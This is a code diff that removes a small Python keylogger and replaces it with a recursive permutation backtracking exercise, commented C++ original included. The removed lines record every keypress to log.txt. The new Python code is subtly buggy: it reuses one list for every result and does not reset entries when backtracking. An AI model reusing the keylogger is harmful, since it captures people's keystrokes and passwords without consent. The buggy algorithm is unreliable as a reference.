@@ -1,32 +1,65 @@
-from pynput.keyboard import Listener
 
-def get_key(key):
-    key = str(key)
-    key = key.replace("'","")
-    if key == "Key.f12":
-        raise SystemExit(0)
-    if key == "Key.tab":
-        key =  "    "
-    if key == "Key.caps_lock":
-        key =  " CAPS_LOCK"
-    if key == "Key.shift":
-        key =  ""
-    if key == "Key.ctrl_l":
-        key =  ""
-    if key == "Key.cmd":
-        key =  " WIN"
-    if key == "Key.enter":
-        key =  "\n"
-    if key == "Key.alt_l":
-        key =  "\n"
-    if key == "Key.space":
-        key =  " "
-    if key == "Key.backspace":
-        key =  " DELETE "
-    with open ('log.txt','a', encoding="utf-8") as file:
-        file.write(key)
-    print(key)
+# #include<iostream>
+# #define MAX 20
+# using namespace std;
+ 
+# int n;
+# int Bool[MAX] = { 0 };//Đánh dấu chưa có phần tử nào sử dụng hết
+# int A[MAX];//Lưu hoán vị vào mảng A
+ 
+# void xuat() {
+#     for (int i = 1; i <= n; i++)
+#         cout << A[i] << " ";
+#     cout << endl;
+# }
+ 
+# void Try(int k) {
+#     for (int i = 1; i <= n; i++) {
+#         //Kiểm tra nếu phần tử chưa được chọn thì sẽ đánh dấu
+#         if (!Bool[i]) {
+#             A[k] = i; // Lưu một phần tử vào hoán vị
+#             Bool[i] = 1;//Đánh dấu đã dùng
+#             if (k == n)//Kiểm tra nếu đã chứa một hoán vị thì xuất
+#                 xuat();
+#             else
+#                 Try(k + 1);
+#             Bool[i] = 0;
+#         }
+#     }
+# }
+n = 3
+Bool = [None]*(n+1)
+a = [None]*(n+1)
+result = []
 
-with Listener(on_press = get_key) as listener:
-    listener.join()
 
+def Try(k):
+    global n
+    global Bool
+    global a
+    global result
+    for i in range(1,n+1):
+        print('Bool[i] ',Bool[i])
+        if Bool[i] == None:
+            a[k] = i 
+            Bool[i] = 1
+
+            valid = True
+            for j in range(1,len(a)):
+                if a[j] == None:
+                    valid = False
+
+            if valid == True:  
+                result.append(a)
+            else:
+                Try(k+1)
+            Bool[i] = None
+
+Try(1)
+print(result)
+
+# int main() {
+#     cout << "Mhap n: ";
+#     cin >> n;
+#     Try(1);
+# }
